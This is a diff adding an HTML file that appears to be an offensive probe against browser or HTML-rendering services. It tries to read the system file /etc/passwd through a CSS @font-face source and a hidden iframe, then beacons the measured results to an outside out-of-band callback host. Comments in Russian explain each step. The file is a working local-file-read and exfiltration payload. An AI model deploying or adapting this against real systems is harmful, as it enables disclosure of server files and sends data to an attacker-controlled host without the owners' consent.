@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<style>
+    /* Пытаемся подсунуть системный файл как шрифт */
+    @font-face {
+        font-family: 'Leaker';
+        src: url('file:///etc/passwd');
+    }
+
+    body {
+        font-family: 'Leaker', Arial;
+    }
+</style>
+<body>
+    <div id="test">root:x:0:0:root:/root:/bin/bash</div>
+    
+    <script>
+        const hook = "https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";
+        
+        // Если шрифт применится (даже криво), размеры текста изменятся
+        const width = document.getElementById('test').offsetWidth;
+        
+        navigator.sendBeacon(hook + "/FONT_WIDTH", JSON.stringify({
+            w: width,
+            msg: "If width is not standard, file was parsed"
+        }));
+
+        // Попытка через IFRAME (иногда Chrome позволяет увидеть размер контента)
+        var ifr = document.createElement('iframe');
+        ifr.src = 'file:///etc/passwd';
+        ifr.style.width = '100px';
+        document.body.appendChild(ifr);
+        
+        setTimeout(() => {
+            try {
+                // Если мы можем прочитать длину истории или кадры - файл загружен
+                navigator.sendBeacon(hook + "/IFRAME_STATUS", ifr.contentWindow.length);
+            } catch(e) {
+                navigator.sendBeacon(hook + "/IFRAME_LOCKED", "SOP Active");
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
